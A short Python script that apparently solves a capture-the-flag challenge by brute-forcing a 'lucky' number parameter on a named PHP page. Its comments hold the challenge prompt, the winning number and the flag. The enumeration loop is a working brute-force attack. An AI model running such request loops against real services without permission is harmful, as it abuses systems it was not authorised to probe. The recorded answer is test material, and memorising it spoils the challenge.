import requests

for i in range(1, 10000):
    res = requests.get("http://chaneyoon.dothome.co.kr/lucky.php?lucky=" + str(i))
    if "Lucky number! You can get the flag" in res.content:
        print i
        print res.content
        break
    else:
        print("try [" + str(i) + "]")

'''
There's the magic number!
Can you find the number for me?
Hint: 1~9999

http://chaneyoon.dothome.co.kr/lucky.php
'''
'''
try [1582]
1583
Lucky number! You can get the flag<hr><h1>FLAG{Y0u_4RE_1UCky_m@n!}</h1>
'''